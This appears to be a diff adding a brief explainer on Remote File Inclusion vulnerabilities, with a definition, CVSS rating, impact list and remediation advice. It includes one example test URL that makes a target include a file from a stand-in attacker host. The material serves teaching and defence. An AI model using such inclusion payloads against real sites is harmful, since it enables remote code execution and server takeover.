@@ -1,0 +1,42 @@
+RFI (Remote File Inclusion) is a web vulnerability where an attacker can include and execute a remote file (from an external server) on the vulnerable application,This happens when user input is used in file include functions without proper validation.
+
+                                                                                   
+                                                                                    Testing way Example
+
+
+https://example.com/index.php?page=http://attacker.com/file.txt
+
+
+
+                                                                                           CVSS
+
+CVSS v3.x: 9.0 – 9.8
+Severity: Critical
+Priority: P1
+
+
+
+                                                                                          Impact
+
+
+If an RFI vulnerability exists, an attacker can:
+🐚 Execute remote malicious code on the server
+🔐 Gain full server compromise
+📂 Read/modify/delete application files
+🦠 Install malware or backdoors
+🗄️ Steal database credentials and sensitive data
+🔁 Pivot to internal systems
+
+
+
+
+                                                                                         Remediation
+
+❌ Never include files directly from user input
+✅ Use allowlist-based file inclusion
+🔍 Strictly validate and sanitize parameters
+🚫 Disable dangerous settings: allow_url_include = Off
+                                allow_url_fopen = Off
+📁 Store include files outside web root
+🛡️ Apply least-privilege file permissions
+🔄 Keep server and application up to date
